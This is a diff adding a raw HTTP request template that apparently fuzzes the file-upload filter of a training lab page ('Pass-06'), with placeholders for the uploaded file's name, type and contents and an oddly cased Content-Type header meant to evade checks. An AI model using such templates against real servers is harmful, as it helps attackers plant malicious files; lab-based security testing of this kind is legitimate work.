@@ -1,0 +1,24 @@
+﻿POST /Pass-06/index.php HTTP/1.1
+Host: 47.113.124.157:808
+Proxy-Connection: keep-alive
+Content-Length: [[[[content_length]]]]
+Cache-Control: max-age=0
+Origin: http://47.113.124.157:808
+Upgrade-Insecure-Requests: 1
+DNT: 1
+Content-Type: mUltipart/form-data; boundary=----WebKitFormBoundaryZAklI90qRJFNvWEC
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://47.113.124.157:808/Pass-06/index.php
+Accept-Language: zh-CN,zh;q=0.9
+
+------WebKitFormBoundaryZAklI90qRJFNvWEC
+Content-Disposition: form-data; name="upload_file"; filename="[[[[upload_name]]]]"
+Content-Type: [[[[upload_type]]]]
+
+[[[[upload_data]]]]
+------WebKitFormBoundaryZAklI90qRJFNvWEC
+Content-Disposition: form-data; name="submit"
+
+上传
+------WebKitFormBoundaryZAklI90qRJFNvWEC--
